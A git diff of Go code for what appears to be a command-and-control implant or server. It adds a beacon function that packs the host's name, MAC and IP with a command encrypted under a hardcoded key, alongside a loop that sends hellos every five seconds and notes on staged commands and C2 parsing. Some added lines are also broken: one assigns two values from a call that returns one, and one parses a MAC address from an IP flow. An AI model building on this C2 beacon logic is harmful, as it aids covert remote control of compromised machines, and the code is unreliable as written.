@@ -17,6 +17,7 @@ import (
 	"strconv"
 	"strings"
 	"syscall"
+	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -513,8 +514,11 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	//get ping command
 	ping := payload[5]
 	if ping != "" {
-		iface, myIP := GetOutwardIface("8.8.8.8:80")
-		go sendHello(iface, src, net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String()), net.ParseMAC(packet.NetworkLayer().NetworkFlow().Src().String()))
+		iface, src := GetOutwardIface("8.8.8.8:80")
+		srcMAC, err := net.ParseMAC(packet.NetworkLayer().NetworkFlow().Src().String())
+		srcIP, err := net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String())
+
+		go sendHello(iface, src, srcIP, srcMAC)
 	}
 	srcport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Src().String())
 	dstport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Dst().String())
@@ -560,6 +564,34 @@ func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Hardware
 		// Send hello every 5 seconds
 		time.Sleep(5 * time.Second)
 	}
+}
+
+// CreateHello creates a HELLO string for callbacks
+// HELLO format:
+//
+//	HELLO: hostname hostMAC hostIP
+//
+//	*NOTE* hostMAC and hostIP will end up being the MAC/IP of the gateway
+//			we are dealing with NAT. This will be handled by the C2 parsing
+func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
+	hostname, err := os.Hostname()
+	if err != nil {
+		log.Fatal("Hostname not found...")
+	}
+	
+	//Encrypt Command
+	plaintext := []byte(os.Args[2])
+	key := []byte("pooppooppooppoop")
+	ciphertext, err := encrypt(plaintext, key)
+	if err != nil {
+		panic(err)
+	}
+	if debugCheck != "" { fmt.Printf("Encrypted: %x\n", ciphertext) }
+	
+	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String() + "#"  + string(ciphertext)
+	if debugCheck != "" { fmt.Println("[+] Payload Created:", hello) }
+
+	return hello
 }
 
 // Simple CLI to update the "stagedCmd" value
